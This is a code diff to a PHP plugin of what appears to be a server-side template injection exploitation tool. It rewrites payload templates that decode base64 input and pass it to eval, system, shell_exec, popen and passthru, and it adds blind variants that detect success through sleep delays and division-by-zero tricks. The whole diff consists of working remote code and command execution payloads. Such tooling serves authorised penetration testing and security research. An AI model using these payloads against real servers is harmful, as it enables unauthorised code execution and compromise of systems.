@@ -24,20 +24,23 @@ class Php_generic(php.Php):
                 'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
             },
             'render_error': {
-                # Just use the wrapped payload for eval
+                # Just use the wrapped payload for eval, but without ; in the end
                 'wrapper_type': "global",
+                'trailer': """)).strval({trailer[0]}+{trailer[1]}))()""",
             },
             'evaluate': {
-                # Dirty hack from Twig
-                'call': 'execute',
-                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
+                'call': 'render',
+                'evaluate': """eval(join("", ["return (", base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), ");"]))""",
                 'test_os': 'echo PHP_OS;',
                 'test_os_expected': r'^[\w-]+$'
             },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """1 / (true && eval(join("", ["return (", base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), ");"])))"""
+            },
             'evaluate_blind': {
-                # Dirty hack from Twig
-                'call': 'execute',
-                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
+                'call': 'inject',
+                'execute_blind': """system(join("", [base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), " && sleep {delay}"]))"""
             },
             'execute': {
                 'call': 'render',
@@ -50,10 +53,14 @@ class Php_generic(php.Php):
                 # Using shell_exec to get full output
                 'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
             },
+            'execute_boolean': {
+                'call': 'inject',
+                'execute_blind': """1 / (pclose(popen(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), "wb")) == 0)"""
+            },
             'execute_blind': {
                 'call': 'inject',
                 # Using passthru to avoid double output
-                'execute_blind': """passthru(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))|cat:" && sleep {delay}")"""
+                'execute_blind': """passthru(join("", [base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))," && sleep {delay}"]))"""
             },
         })
 
